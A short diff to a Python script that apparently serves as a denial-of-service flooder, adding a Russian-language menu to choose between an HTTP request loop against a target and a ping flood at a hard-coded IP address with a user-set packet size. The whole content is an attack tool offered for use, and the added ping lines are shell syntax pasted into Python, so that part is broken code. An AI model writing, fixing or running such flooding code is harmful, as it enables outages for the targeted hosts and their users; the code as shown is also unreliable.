@@ -20,5 +20,28 @@ def dos():
  while True:
   requests.get("%s" % str(ddos))
   
+def dos2():
+ while True:
+  ping 174.123.1.23 -t -l str(paket)
 while True:
- threading.Thread(target=dos).start()
+ print(-"""
+ 
+ 
+ 1 - способ №1
+ 2 - способ №2
+ 3 - все сразу
+ 
+ """)
+ menu = input("Введите цифру: ")
+ 
+ if "1" == menu:
+  input("Нажмите на Enter чтобы начать!")
+  threading.Thread(target=dos).start()
+ elif "2" == menu:
+  paket = input("Введите количество запросов в секунду: ")
+  input("Нажмите на Enter чтобы начать!")
+  while True:
+   ping 174.123.1.23 -t -l str(paket)
+ else:
+  print("Данный режим не сушествует!")
+  
